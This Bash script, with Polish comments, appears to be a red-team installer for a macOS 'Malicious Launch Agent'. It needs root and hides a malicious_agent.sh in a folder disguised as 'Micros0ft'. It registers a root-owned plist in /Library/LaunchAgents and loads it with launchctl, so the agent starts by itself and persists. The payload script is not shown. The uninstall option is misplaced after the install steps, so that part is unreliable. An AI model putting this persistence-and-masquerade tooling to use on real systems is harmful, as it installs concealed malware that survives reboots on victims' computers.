#!/bin/bash

# Installer dla Malicious Launch Agent - RED TEAM
# ⚠️ TYLKO DO CELÓW EDUKACYJNYCH NA WŁASNYM SPRZĘCIE

set -e

AGENT_DIR="/Users/Shared/Micros0ft"
PLIST_NAME="com.bugbusters.malicious.plist"
PLIST_SOURCE="$(dirname "$0")/agent/$PLIST_NAME"
PLIST_DEST="/Library/LaunchAgents/$PLIST_NAME"
SCRIPT_SOURCE="$(dirname "$0")/malicious_agent.sh"
SCRIPT_DEST="$AGENT_DIR/malicious_agent.sh"

# Sprawdź uprawnienia
if [ "$EUID" -ne 0 ]; then
    echo "❌ Ten skrypt wymaga uprawnień administratora (sudo)"
    echo "Użyj: sudo $0"
    exit 1
fi

echo "🔴 RED TEAM - Instalator Malicious Launch Agent"
echo "⚠️  OSTRZEŻENIE: To narzędzie jest tylko do celów edukacyjnych!"
echo ""
read -p "Czy na pewno chcesz kontynuować? (tak/nie): " confirm

if [ "$confirm" != "tak" ]; then
    echo "Instalacja anulowana."
    exit 0
fi

# Utwórz katalogi
echo "📁 Tworzenie katalogów..."
mkdir -p "$AGENT_DIR"
mkdir -p "$AGENT_DIR/data"

# Skopiuj skrypt agenta
echo "📋 Kopiowanie skryptu agenta..."
cp "$SCRIPT_SOURCE" "$SCRIPT_DEST"
chmod +x "$SCRIPT_DEST"
chown root:wheel "$SCRIPT_DEST"

# Skopiuj i zmodyfikuj plist
echo "📋 Kopiowanie pliku Launch Agent..."
cp "$PLIST_SOURCE" "$PLIST_DEST"
chown root:wheel "$PLIST_DEST"
chmod 644 "$PLIST_DEST"

# Załaduj Launch Agent
echo "🚀 Ładowanie Launch Agent..."
launchctl load "$PLIST_DEST" 2>/dev/null || launchctl load -w "$PLIST_DEST"

# Sprawdź status
if launchctl list | grep -q "com.bugbusters.malicious"; then
    echo "✅ Agent został pomyślnie zainstalowany i uruchomiony!"
    echo "📝 Pliki agenta znajdują się w: $AGENT_DIR"
    echo "📋 Plik konfiguracyjny: $PLIST_DEST"
    echo ""
    echo "Aby sprawdzić status: launchctl list | grep bugbusters"
    echo "Aby zatrzymać: sudo launchctl unload $PLIST_DEST"
    echo "Aby usunąć: sudo $0 --uninstall"
else
    echo "⚠️  Agent został zainstalowany, ale może nie być aktywny."
    echo "Sprawdź logi w: $AGENT_DIR/agent_error.log"
fi

# Funkcja odinstalowania
if [ "$1" == "--uninstall" ]; then
    echo ""
    echo "🗑️  Odinstalowywanie agenta..."
    
    # Zatrzymaj i usuń Launch Agent
    launchctl unload "$PLIST_DEST" 2>/dev/null || true
    rm -f "$PLIST_DEST"
    
    # Usuń pliki agenta (opcjonalnie - zakomentuj jeśli chcesz zachować logi)
    # rm -rf "$AGENT_DIR"
    
    echo "✅ Agent został odinstalowany."
    exit 0
fi

